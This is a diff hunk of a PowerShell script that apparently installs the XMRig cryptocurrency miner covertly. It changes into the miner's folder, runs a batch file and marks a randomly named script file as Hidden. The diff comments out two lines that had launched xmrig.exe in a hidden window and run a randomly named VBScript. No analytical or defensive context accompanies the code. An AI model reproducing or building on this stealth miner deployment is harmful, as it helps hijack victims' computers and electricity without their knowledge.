@@ -115,8 +115,8 @@ cd "$initial_dir\xmrig-6.22.2"
 Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
 #Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait
 
-Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
-& "./TMqhONoBljEv.vbs"
+#Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
+#& "./TMqhONoBljEv.vbs"
 
 Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"
 
